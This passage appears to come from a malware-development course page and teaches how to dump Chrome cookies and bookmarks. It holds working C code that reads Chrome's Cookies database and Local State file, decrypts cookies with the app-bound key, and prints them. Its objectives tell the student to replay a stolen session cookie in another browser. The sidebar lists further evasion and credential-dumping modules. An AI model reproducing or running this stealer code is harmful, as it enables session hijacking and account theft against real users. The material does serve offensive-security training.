<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CONST CHAR CookiesSqlQuery<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"SELECT host_key, path, name, datetime((expires_utc / 1000000) - 11644473600, 'unixepoch', 'localtime'), encrypted_value, length(encrypted_value) from cookies;"</span><span class="token punctuation">;</span>

INT <span class="token function">CookiesSqlCallback</span><span class="token punctuation">(</span>PVOID AppBoundKey<span class="token punctuation">,</span> INT Argc<span class="token punctuation">,</span> PCHAR<span class="token operator">*</span> Argv<span class="token punctuation">,</span> PCHAR<span class="token operator">*</span> ColumnName<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- URL: %hS\n"</span><span class="token punctuation">,</span> Argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Path: %hS\n"</span><span class="token punctuation">,</span> Argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Name: %hS\n"</span><span class="token punctuation">,</span> Argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Expires: %hS\n"</span><span class="token punctuation">,</span> Argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">PrintChromeSecret</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span>AppBoundKey<span class="token punctuation">,</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span>Argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>Argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

VOID <span class="token function">DumpChromeCookies</span><span class="token punctuation">(</span>_In_ PUCHAR AppBoundKey<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">PrintCookiesBanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Open the "Cookies" database file</span>
    <span class="token comment">//</span>

    sqlite3<span class="token operator">*</span> CookiesDatabase<span class="token punctuation">;</span>
    ULONG    Result<span class="token punctuation">;</span>

    Result <span class="token operator">=</span> <span class="token function">sqlite3_open_v2</span><span class="token punctuation">(</span><span class="token string">"Google\\Chrome\\User Data\\Default\\Network\\Cookies"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>CookiesDatabase<span class="token punctuation">,</span> SQLITE_OPEN_READONLY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">!=</span> SQLITE_OK<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Error opening the cookies database: %hS\n"</span><span class="token punctuation">,</span> <span class="token function">sqlite3_errmsg</span><span class="token punctuation">(</span>CookiesDatabase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Execute a query that will retrieve the cookies</span>
    <span class="token comment">//</span>

    PCHAR ErrorMessage<span class="token punctuation">;</span>
    Result <span class="token operator">=</span> <span class="token function">sqlite3_exec</span><span class="token punctuation">(</span>CookiesDatabase<span class="token punctuation">,</span> CookiesSqlQuery<span class="token punctuation">,</span> CookiesSqlCallback<span class="token punctuation">,</span> AppBoundKey<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ErrorMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">!=</span> SQLITE_OK<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Failed querying the logins table of the database: %hS\n"</span><span class="token punctuation">,</span> ErrorMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sqlite3_free</span><span class="token punctuation">(</span>ErrorMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">sqlite3_close_v2</span><span class="token punctuation">(</span>CookiesDatabase<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-13">Dumping Chrome Bookmarks</h3>
<p>Bookmarks are stored in the <code>%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks</code> file in JSON. Let us examine a sample <code>Bookmarks</code> file:</p>
<pre><code>{
   "checksum": "aa500b04b960dc8fea4471baa1d54699",
   "roots": {
      "other": {
         "children": [ {
            "date_added": "13402846428966999",
            "date_last_used": "0",
            "guid": "dc0ec706-5ab7-4cf5-a67b-b282582ae666",
            "id": "5",
            "meta_info": {
               "power_bookmark_meta": ""
            },
            "name": "Maldev Academy - Advanced Training for Cyber Security Professionals",
            "type": "url",
            "url": "https://maldevacademy.com/"
         }, {
            "date_added": "13402846642600565",
            "date_last_used": "0",
            "guid": "8e37a94b-913c-4a4c-b188-d04c81e6bbe3",
            "id": "7",
            "meta_info": {
               "power_bookmark_meta": ""
            },
            "name": "DuckDuckGo",
            "type": "url",
            "url": "https://duckduckgo.com/"
         } ],
         "date_added": "13402846422837141",
         "date_last_used": "0",
         "date_modified": "13402848226097737",
         "guid": "82b081ec-3dd3-529c-8475-ab6c344590dd",
         "id": "2",
         "name": "Other bookmarks",
         "type": "folder"
      },
   },
   "version": 1
}
</code></pre>
<p>We see that there is a <code>name</code> and <code>url</code> attribute for each bookmark saved by Chrome. As such, we can dump bookmarks by simply printing the value of each <code>name</code> and <code>url</code> pair.</p>
<p>This process is encapsulated in the <code>DumpChromeBookmarks</code> function. First, it reads the JSON file containing the bookmarks using the <code>ReadFileContents</code> helper. Then, in a <code>for</code> loop, it uses <code>strstr</code> to iterate over all instances of the <code>"name": </code> string, signifying the presence of a <code>name</code>
 attribute. As the value of this attribute is enclosed in quotation 
marks, its size can be determined by scanning for the closing quotation 
mark. After that, the function uses <code>strstr</code> again to find the next <code>"url": </code> string, which represents the corresponding <code>url</code> attribute. Finally, the name and URL of the bookmark are printed to the screen.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">DumpChromeBookmarks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">PrintBookmarksBanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    PSTR  BookmarksJson<span class="token punctuation">;</span>
    PSTR  Name<span class="token punctuation">;</span>
    ULONG NameSize<span class="token punctuation">;</span>
    PSTR  Url<span class="token punctuation">;</span>
    ULONG UrlSize<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Read the bookmarks JSON file</span>
    <span class="token comment">//</span>

    BookmarksJson <span class="token operator">=</span> <span class="token punctuation">(</span>PSTR<span class="token punctuation">)</span><span class="token function">ReadFileContents</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span>L<span class="token string">"Google\\Chrome\\User Data\\Default\\Bookmarks"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>BookmarksJson <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>Name <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>BookmarksJson<span class="token punctuation">,</span> <span class="token string">"\"name\":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Name <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> Name <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>Url<span class="token punctuation">,</span> <span class="token string">"\"name\""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Name    <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token string">"\"name\": "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        NameSize <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>Name<span class="token punctuation">,</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token operator">-</span> Name<span class="token punctuation">;</span>

        Url <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>Name <span class="token operator">+</span> NameSize<span class="token punctuation">,</span> <span class="token string">"\"url\":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>Url <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        Url    <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token string">"\"url\": "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        UrlSize <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>Url<span class="token punctuation">,</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token operator">-</span> Url<span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Print the name and URL of the bookmark</span>
        <span class="token comment">// </span>

        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Name: %.*hS\n"</span><span class="token punctuation">,</span>  NameSize<span class="token punctuation">,</span> Name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- URL: %.*hS\n\n"</span><span class="token punctuation">,</span> UrlSize<span class="token punctuation">,</span>  Url<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Continue the search after this URL</span>
        <span class="token comment">//</span>

        Url <span class="token operator">+=</span> UrlSize <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token char">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> BookmarksJson<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>In order to add this functionality to our tool, we simply need to call <code>DumpChromeBookmarks</code> anywhere after setting the current working directory to the <code>AppData\Local</code> folder.</p>
<h3 id="toc-heading-14">The Main Function</h3>
<p>Putting it all together, we obtain the path to the user's <code>AppData\Local</code>
 folder, set it as the current working directory and read the local 
state file to extract the app-bound encryption key. If this is 
successful, we will use <code>DumpChromeCookies</code> and <code>DumpChromeBookmarks</code> to dump Chrome's cookies and bookmarks.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">INT <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//</span>
    <span class="token comment">// Get the path to the AppData\Local folder</span>
    <span class="token comment">//</span>

    HRESULT Result<span class="token punctuation">;</span>
    PWSTR   AppDataPath<span class="token punctuation">;</span>
    PUCHAR  LocalState<span class="token punctuation">;</span>
    UCHAR   AppBoundKey<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    Result <span class="token operator">=</span> <span class="token function">SHGetKnownFolderPath</span><span class="token punctuation">(</span>FOLDERID_LocalAppData<span class="token punctuation">,</span> KF_FLAG_DONT_UNEXPAND<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FAILED</span><span class="token punctuation">(</span>Result<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not get the path of the AppData folder: %lu\n"</span><span class="token punctuation">,</span> Result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Set it as the current working directory</span>
    <span class="token comment">//</span>

    <span class="token function">SetCurrentDirectoryW</span><span class="token punctuation">(</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CoTaskMemFree</span><span class="token punctuation">(</span>AppDataPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Free the memory allocated by SHGetKnownFolderPath</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get the app-bound encryption key</span>
    <span class="token comment">//</span>

    LocalState <span class="token operator">=</span> <span class="token function">ReadFileContents</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span>L<span class="token string">"Google\\Chrome\\User Data\\Local State"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>LocalState <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    Result <span class="token operator">=</span> <span class="token function">ExtractAppBoundKey</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PSTR<span class="token punctuation">)</span>LocalState<span class="token punctuation">,</span> AppBoundKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> LocalState<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Dump the chrome cookies and bookmarks</span>
    <span class="token comment">//</span>

    <span class="token function">DumpChromeCookies</span><span class="token punctuation">(</span>AppBoundKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">DumpChromeBookmarks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-15">Demo</h3>
<img src="81_files/Demo-3.png" style="margin:auto" width="800px">

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Log into a website of your choice using Chrome and use the provided tool to extract the cookies</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Open
 the website again in an incognito tab and use Chrome's Developer Tools 
to import the extracted session cookie and refresh the page</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Dumping Browser Cookies: Chrome</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Cookie Storage</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">The PrintChromeSecret Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">The Aes256GcmDecrypt Helper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">Application-Bound Encryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">Chrome Elevation Service</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Mimicking The Elevation Service</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">The Decryption Process</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">The ExtractAppBoundKey Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">The DecryptAppBoundKey Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">The DecryptUsingChromeKey Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">Dumping Chrome Cookies</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">Dumping Chrome Bookmarks</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">The Main Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">Demo</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="81_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
